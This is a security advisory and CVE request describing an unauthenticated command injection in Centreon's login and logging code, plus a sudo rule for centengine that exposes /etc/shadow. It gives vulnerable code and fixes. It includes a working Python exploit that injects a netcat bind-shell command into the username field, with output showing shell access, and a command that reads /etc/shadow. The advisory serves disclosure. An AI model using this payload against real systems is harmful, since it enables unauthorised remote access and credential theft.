Unauthenticated remote command execution  This vulnerability allows an unauthenticated user to execute arbitrary commands on the remote system.  2. Information disclosure (local)  A specific command-line utility allows local users to escalate privileges and retrieve sensitive files on the system, such as /etc/shadow. This vulnerability provides a root user access on files (read only).  Vendor was notified and fixed the vulnerabilities.  List of related commits:  * * *   Our security advisory follows. We would like to request 2 CVEs for these vulnerabilities.   ================================================================== Unauthenticated Remote Command Execution in Centreon Web Interface ==================================================================   Description ===========  A critical vulnerability has been found in the Centreon logging class allowing remote users to execute arbitrary commands.   SQL injection =============  Centreon logs SQL database errors in a log file using the "echo" system command and the exec() PHP function. On the authentification class, Centreon use htmlentities with the ENT_QUOTES options to filter SQL entities. However, Centreon doesn't filter the SQL escape character "\" and it is possible to generate an SQL Error. Because of the use of the "echo" system command with the PHP exec() function, and because of the lack of sanitization, it is possible to inject arbitrary system commands.  **Access Vector**: remote  **Security Risk**: high  ---------------- Proof of Concept ----------------  TCP BindShell using netcat.  #!/usr/bin/env python import requests import argparse  def shell(target, bindport):     print "[~] Starting bindshell on : %s - port : %d" % (target, bindport)     req = requests.post(target, data={"useralias": "$(nc -lvp %d -e /bin/sh)\\" % bindport, "password": "foo"})     print("[+] Bye !")  if __name__ == "__main__":     print "[~] Centreon Unauthentificated RCE - Nicolas Chatelain <n.chatelain@...dream.com>"     parser = argparse.ArgumentParser()     parser.add_argument("--target", required=True)     parser.add_argument("--bindport", required=True, type=int)     args = parser.parse_args()     shell(args.target, args.bindport)   nightlydev@...rkstation ~/Lab/Centreon $ python centreon-shell.py --bindport [~] Centreon Unauthentificated RCE - Nicolas Chatelain <n.chatelain@...dream.com> [~] Starting bindshell on : - port :  # Other term  nightlydev@...rkstation ~/Lab/Centreon $ nc whoami apache groups apache centreon-engine centreon-broker centreon nagios   --------------- Vulnerable code ---------------  The vulnerable code is located in class/centreonLog.class.php, line 82 and line  .. code-block:: php  		/* 		 * print Error in log file. 		 */ 		exec("echo \"".$string."\" >> ".$this->errorType[$id]);  In class/centreonAuth.class.php, line  .. code-block:: php  	 $DBRESULT = $this->pearDB->query("SELECT * FROM `contact` WHERE `contact_alias` = '" . htmlentities($username, ENT_QUOTES, "UTF-8") . "' AND `contact_activate` = '1' AND 		 `contact_register` = '1' LIMIT 1");   -------- Solution --------  Use the fopen, fwrite and fclose functions to write log data.   Possible root password disclosure in centengine (Centreon Entreprise Server) ============================================================================  In some configurations, when centengine can run as root (with sudo). It's possible to read some file content.  **Access Vector**: local  **Security Risk**: high  ---------------- Proof of Concept ----------------  $ sudo /usr/sbin/centengine -v /etc/shadow reading main config file error while processing a config file: [/etc/shadow:1] bad variable name:  --------------- Vulnerable code ---------------  In Centreon Entreprise Server (CES) : /etc/sudoers.d/centreon  CENTREON   ALL = NOPASSWD: /usr/sbin/centengine -v *  -------- Solution --------  Do not allow centengine to be run as root or do not disclose the line that caused the error.
